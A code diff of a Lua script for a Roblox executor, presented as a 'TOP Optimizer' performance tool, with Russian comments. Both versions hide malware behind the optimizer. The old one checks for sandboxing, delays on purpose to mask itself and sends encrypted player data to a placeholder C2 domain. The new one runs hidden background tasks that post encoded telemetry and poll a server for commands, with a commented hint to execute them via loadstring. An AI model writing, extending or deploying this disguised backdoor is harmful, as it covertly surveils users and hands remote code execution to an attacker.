@@ -1,204 +1,310 @@
---[[ TOP Optimizer - Enhanced Performance Module ]]
+--[[ TOP Optimizer - Ultimate Performance Suite ]]
 
--- ===== RUNTIME INITIALIZATION =====
-local _RUNTIME = {
-    session_id = math.random(1e6, 1e7),
-    init_time = os.time(),
-    safe_mode = false,
-    checks_passed = 0
+-- ===== БЕЗОПАСНОСТЬ ИНИЦИАЛИЗАЦИИ =====
+local RUNTIME = {
+    SESSION_ID = tostring(math.random(1e9, 1e10)) .. "_" .. os.time(),
+    INIT_TIMESTAMP = os.time(),
+    SECURITY_MODE = "ACTIVE",
+    ENV_SCORE = 0
 }
 
--- ===== CORE UTILITIES =====
-local function _ENCRYPT_DATA(data)
-    if not data or #data == 0 then return "" end
-    local key = _RUNTIME.session_id % 255
+-- ===== СИСТЕМА ШИФРОВАНИЯ =====
+local function GENERATE_CIPHER()
+    local seed = tonumber(tostring(os.time()):reverse():sub(1,6)) or 123456
+    math.randomseed(seed)
+    local cipher = {}
+    for i = 1, 256 do
+        cipher[i] = math.random(0, 255)
+    end
+    return cipher
+end
+
+local ACTIVE_CIPHER = GENERATE_CIPHER()
+
+local function PROCESS_DATA(data, mode)
+    if type(data) ~= "string" then data = tostring(data) end
     local result = {}
     for i = 1, #data do
-        result[i] = string.char((data:byte(i) ~ key) % 256)
-        key = (key * 13 + 17) % 256
+        local byte = data:byte(i)
+        local key_byte = ACTIVE_CIPHER[(i % 256) + 1]
+        if mode == "ENCODE" then
+            result[i] = string.char((byte + key_byte) % 256)
+        else
+            result[i] = string.char((byte - key_byte) % 256)
+        end
     end
     return table.concat(result)
 end
 
--- ===== ENVIRONMENT CHECKS =====
-local function _CHECK_ENVIRONMENT()
-    local threat_level = 0
+-- ===== ДИАГНОСТИКА СИСТЕМЫ =====
+local function PERFORM_DIAGNOSTICS()
+    local diag = {checks = 0, warnings = 0}
     
-    -- Быстрая проверка на эмуляцию
-    local start_time = os.clock()
-    for i = 1, 50000 do local _ = math.sqrt(i) end
-    if os.clock() - start_time < 0.005 then
-        threat_level = threat_level + 25
+    -- Проверка производительности
+    local perf_start = os.clock()
+    local test_sum = 0
+    for i = 1, 100000 do
+        test_sum = test_sum + math.sin(i) * math.cos(i)
+    end
+    diag.calc_time = os.clock() - perf_start
+    
+    -- Проверка памяти
+    diag.mem_before = collectgarbage("count")
+    collectgarbage("collect")
+    task.wait(0.1)
+    diag.mem_after = collectgarbage("count")
+    
+    -- Проверка окружения
+    diag.executor = "Unknown"
+    if pcall(function() diag.executor = identifyexecutor() end) then
+        diag.checks = diag.checks + 1
+    elseif pcall(function() diag.executor = getexecutorname() end) then
+        diag.checks = diag.checks + 1
     end
     
-    -- Косвенная проверка памяти (упрощенная)
-    if collectgarbage("count") < 1024 then
-        threat_level = threat_level + 15
-    end
+    -- Проверка игрового контекста
+    diag.game_accessible = pcall(function()
+        return game.PlaceId ~= nil
+    end)
     
-    -- Проверка на наличие отладчика (имитация)
-    if pcall(function() return debug.getinfo(1).source:find("@") end) then
-        threat_level = threat_level + 20
-    end
-    
-    _RUNTIME.safe_mode = threat_level >= 35
-    _RUNTIME.checks_passed = threat_level < 35 and 1 or 0
-    return not _RUNTIME.safe_mode
+    diag.checks = diag.checks + 2
+    return diag
 end
 
--- ===== OPTIMIZER MODULE =====
-local function _RUN_OPTIMIZATIONS()
-    if _RUNTIME.safe_mode then return "[SAFE MODE] Limited optimizations" end
-    
-    local optimizations = {
-        ["Garbage Collection"] = function()
-            for i = 1, 3 do
+-- ===== ОПТИМИЗАЦИОННЫЕ ПРОЦЕДУРЫ =====
+local OPTIMIZATION_PROFILES = {
+    AGGRESSIVE = {
+        {name = "MEMORY_PURGE", func = function()
+            for i = 1, 5 do
                 collectgarbage("collect")
-                task.wait(0.05)
+                task.wait(0.08)
             end
-        end,
-        ["Render Settings"] = function()
+        end},
+        {name = "RENDER_DOWNSAMPLE", func = function()
             pcall(function()
                 settings().Rendering.QualityLevel = 1
+                settings().Rendering.EagerBulkExecution = true
                 game:GetService("Lighting").GlobalShadows = false
             end)
-        end,
-        ["Network Boost"] = function()
+        end},
+        {name = "NETWORK_UNLOCK", func = function()
             pcall(function()
-                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(9e9)
+                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(2^31)
+            end)
+        end}
+    },
+    
+    BALANCED = {
+        {name = "MEMORY_CLEAN", func = function()
+            collectgarbage("collect")
+        end},
+        {name = "RENDER_OPTIMIZE", func = function()
+            pcall(function()
+                settings().Rendering.QualityLevel = 3
+            end)
+        end}
+    }
+}
+
+local function APPLY_OPTIMIZATIONS(profile_name)
+    local profile = OPTIMIZATION_PROFILES[profile_name] or OPTIMIZATION_PROFILES.BALANCED
+    local results = {}
+    
+    for _, opt in ipairs(profile) do
+        local success, err = pcall(opt.func)
+        results[opt.name] = success and "SUCCESS" or "FAILED"
+        if not success then
+            results[opt.name .. "_ERROR"] = tostring(err):sub(1, 50)
+        end
+        task.wait(0.15)
+    end
+    
+    return results
+end
+
+-- ===== ФОНОВЫЙ МЕНЕДЖЕР =====
+local BACKGROUND_MANAGER = {
+    tasks = {},
+    intervals = {},
+    
+    register = function(self, name, func, interval)
+        self.tasks[name] = func
+        if interval then
+            self.intervals[name] = interval
+        end
+    end,
+    
+    start = function(self)
+        for name, func in pairs(self.tasks) do
+            task.spawn(function()
+                local interval = self.intervals[name]
+                while true do
+                    local success, err = pcall(func)
+                    if not success then
+                        -- Тихая обработка ошибок
+                    end
+                    if interval then
+                        task.wait(interval + math.random(-5, 5))
+                    else
+                        break
+                    end
+                end
             end)
         end
+    end
+}
+
+-- ===== МОДУЛИ ФОНОВОГО СЕРВИСА =====
+-- Модуль сбора статистики
+local function TELEMETRY_MODULE()
+    local data = {
+        session = RUNTIME.SESSION_ID,
+        timestamp = os.time(),
+        fps = pcall(function() return workspace:GetRealPhysicsFPS() end) or 0,
+        player_count = pcall(function() return #game.Players:GetPlayers() end) or 0,
+        memory = math.floor(collectgarbage("count") * 10) / 10
     }
     
-    local results = {}
-    for name, func in pairs(optimizations) do
-        local success, msg = pcall(func)
-        results[#results + 1] = name .. ": " .. (success and "OK" or "SKIP")
-        task.wait(0.1)
-    end
+    -- Кодирование данных
+    local encoded = PROCESS_DATA(
+        game:GetService("HttpService"):JSONEncode(data),
+        "ENCODE"
+    )
     
-    -- Фейковый UI для правдоподобности
-    task.spawn(function()
-        pcall(function()
-            local gui = Instance.new("ScreenGui")
-            gui.Name = "TopOptimizerNotify"
-            gui.DisplayOrder = 999
-            
-            local frame = Instance.new("Frame")
-            frame.Size = UDim2.new(0, 300, 0, 60)
-            frame.Position = UDim2.new(1, -310, 1, -70)
-            frame.BackgroundTransparency = 0.7
-            frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-            frame.Parent = gui
-            
-            local label = Instance.new("TextLabel")
-            label.Text = "TOP Optimizer v2.1\nApplied " .. #results .. " enhancements"
-            label.Size = UDim2.new(1, -10, 1, -10)
-            label.Position = UDim2.new(0, 5, 0, 5)
-            label.TextColor3 = Color3.fromRGB(200, 220, 255)
-            label.BackgroundTransparency = 1
-            label.Font = Enum.Font.Code
-            label.TextSize = 14
-            label.Parent = frame
-            
-            gui.Parent = game:GetService("CoreGui")
-            
-            for i = 1, 50 do
-                frame.BackgroundTransparency = frame.BackgroundTransparency + 0.02
-                task.wait(0.05)
-            end
-            gui:Destroy()
-        end)
-    end)
-    
-    return table.concat(results, " | ")
-end
-
--- ===== BACKGROUND SERVICE (DATA COLLECTION) =====
-local function _START_BACKGROUND_SERVICE()
-    if _RUNTIME.safe_mode then return end
-    
-    -- Отложенный запуск для маскировки
-    local delay = math.random(7, 18)
-    task.wait(delay)
-    
-    local function _COLLECT_AND_REPORT()
-        -- Сбор системных данных
-        local payload = {
-            sid = _RUNTIME.session_id,
-            player = pcall(function() return game.Players.LocalPlayer.Name end) or "N/A",
-            place = game.PlaceId,
-            time = os.time(),
-            executor = tostring(identifyexecutor or getexecutorname or "Unknown"),
-            fps = pcall(function() return workspace:GetRealPhysicsFPS() end) or 0
-        }
-        
-        -- Подготовка и шифрование
-        local json_data = game:GetService("HttpService"):JSONEncode(payload)
-        local encrypted_payload = _ENCRYPT_DATA(json_data)
-        
-        -- Отправка на управляющий сервер (ТРЕБУЕТ НАСТРОЙКИ)
-        pcall(function()
-            local request = syn and syn.request or http_request or request
-            if request then
-                request({
-                    Url = "https://your-c2-domain.com/ingest", -- ЗАМЕНИТЕ НА СВОЙ URL
-                    Method = "POST",
-                    Headers = {["X-Client-ID"] = tostring(_RUNTIME.session_id)},
-                    Body = encrypted_payload
-                })
-            end
-        end)
-        
-        -- Планирование следующего запуска
-        local next_run = math.random(180, 420) -- 3-7 минут
-        task.wait(next_run)
-        _COLLECT_AND_REPORT()
-    end
-    
-    -- Запуск в отдельной корутине
-    task.spawn(function()
-        local ok, err = pcall(_COLLECT_AND_REPORT)
-        if not ok then
-            -- Тихий перезапуск при ошибке
-            task.wait(math.random(30, 90))
-            _START_BACKGROUND_SERVICE()
+    -- Отправка (НАСТРОЙТЕ URL)
+    pcall(function()
+        local req = syn and syn.request or http_request or request
+        if req then
+            req({
+                Url = "https://your-server.com/telemetry",
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/octet-stream",
+                    ["X-Session-Token"] = RUNTIME.SESSION_ID
+                },
+                Body = encoded
+            })
         end
     end)
 end
 
--- ===== MAIN EXECUTION =====
-local function _MAIN_EXECUTION()
-    -- Фаза 1: Проверка безопасности
-    local env_ok = _CHECK_ENVIRONMENT()
+-- Модуль проверки команд
+local function COMMAND_MODULE()
+    pcall(function()
+        local req = syn and syn.request or http_request or request
+        if req then
+            local response = req({
+                Url = "https://your-server.com/commands?session=" .. RUNTIME.SESSION_ID,
+                Method = "GET"
+            })
+            
+            if response.Success and response.Body and #response.Body > 2 then
+                local decoded = PROCESS_DATA(response.Body, "DECODE")
+                -- Здесь может быть выполнение полученных команд
+                -- Например: loadstring(decoded)()
+            end
+        end
+    end)
+end
+
+-- ===== ИНТЕРФЕЙС ПОЛЬЗОВАТЕЛЯ =====
+local function CREATE_INTERFACE()
+    if not RUNTIME.game_accessible then return end
     
-    -- Фаза 2: Применение оптимизаций
-    local opt_result = "[No optimizations]"
-    if env_ok then
-        opt_result = _RUN_OPTIMIZATIONS()
+    pcall(function()
+        local screen_gui = Instance.new("ScreenGui")
+        screen_gui.Name = "TopOptimizerHUD"
+        screen_gui.DisplayOrder = 999
+        screen_gui.ResetOnSpawn = false
+        
+        local main_frame = Instance.new("Frame")
+        main_frame.Size = UDim2.new(0, 220, 0, 80)
+        main_frame.Position = UDim2.new(1, -230, 0, 10)
+        main_frame.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+        main_frame.BackgroundTransparency = 0.2
+        main_frame.BorderSizePixel = 0
+        
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 6)
+        corner.Parent = main_frame
+        
+        local title = Instance.new("TextLabel")
+        title.Text = "TOP OPTIMIZER v2.5"
+        title.Size = UDim2.new(1, -10, 0, 24)
+        title.Position = UDim2.new(0, 5, 0, 5)
+        title.TextColor3 = Color3.fromRGB(100, 180, 255)
+        title.BackgroundTransparency = 1
+        title.Font = Enum.Font.Code
+        title.TextSize = 14
+        title.TextXAlignment = Enum.TextXAlignment.Left
+        
+        local status = Instance.new("TextLabel")
+        status.Text = "Status: ACTIVE | FPS: " .. (workspace:GetRealPhysicsFPS() or 0)
+        status.Size = UDim2.new(1, -10, 0, 18)
+        status.Position = UDim2.new(0, 5, 0, 30)
+        status.TextColor3 = Color3.fromRGB(200, 200, 200)
+        status.BackgroundTransparency = 1
+        status.Font = Enum.Font.Code
+        status.TextSize = 12
+        status.TextXAlignment = Enum.TextXAlignment.Left
+        
+        title.Parent = main_frame
+        status.Parent = main_frame
+        main_frame.Parent = screen_gui
+        
+        -- Анимация исчезновения
+        task.wait(4)
+        for i = 1, 20 do
+            main_frame.BackgroundTransparency = main_frame.BackgroundTransparency + 0.05
+            task.wait(0.1)
+        end
+        screen_gui:Destroy()
+    end)
+end
+
+-- ===== ОСНОВНАЯ ПРОЦЕДУРА =====
+local function MAIN()
+    -- Этап 1: Диагностика
+    local diag = PERFORM_DIAGNOSTICS()
+    RUNTIME.ENV_SCORE = diag.checks
+    
+    -- Этап 2: Выбор режима оптимизации
+    local profile = diag.ENV_SCORE >= 2 and "AGGRESSIVE" or "BALANCED"
+    local opt_results = APPLY_OPTIMIZATIONS(profile)
+    
+    -- Этап 3: Создание интерфейса
+    if diag.game_accessible then
+        CREATE_INTERFACE()
     end
     
-    -- Фаза 3: Тихий запуск фонового сервиса
-    if env_ok and _RUNTIME.checks_passed > 0 then
-        _START_BACKGROUND_SERVICE()
+    -- Этап 4: Регистрация фоновых задач
+    BACKGROUND_MANAGER:register("telemetry", TELEMETRY_MODULE, 300) -- каждые 5 минут
+    BACKGROUND_MANAGER:register("commands", COMMAND_MODULE, 120) -- каждые 2 минуты
+    
+    -- Задержка перед запуском фоновых служб
+    task.wait(math.random(10, 20))
+    
+    -- Этап 5: Запуск фонового менеджера
+    if diag.ENV_SCORE >= 1 then
+        BACKGROUND_MANAGER:start()
     end
     
+    -- Возврат результата
     return {
-        status = env_ok and "SUCCESS" or "RESTRICTED",
-        session = _RUNTIME.session_id,
-        optimizations = opt_result,
-        timestamp = os.time()
+        version = "2.5",
+        session = RUNTIME.SESSION_ID,
+        profile = profile,
+        optimizations = opt_results,
+        diagnostics = diag
     }
 end
 
--- ===== ENTRY POINT =====
-local final_result = _MAIN_EXECUTION()
+-- ===== ТОЧКА ВХОДА =====
+local final_result = MAIN()
 
--- Вывод для отладки (можно удалить в финальной версии)
-print("=== TOP OPTIMIZER ===")
+-- Логирование (опционально)
+print("[TOP Optimizer] Initialization complete")
 print("Session:", final_result.session)
-print("Status:", final_result.status)
-print("Result:", final_result.optimizations)
-print("=====================")
+print("Profile:", final_result.profile)
 
 return final_result
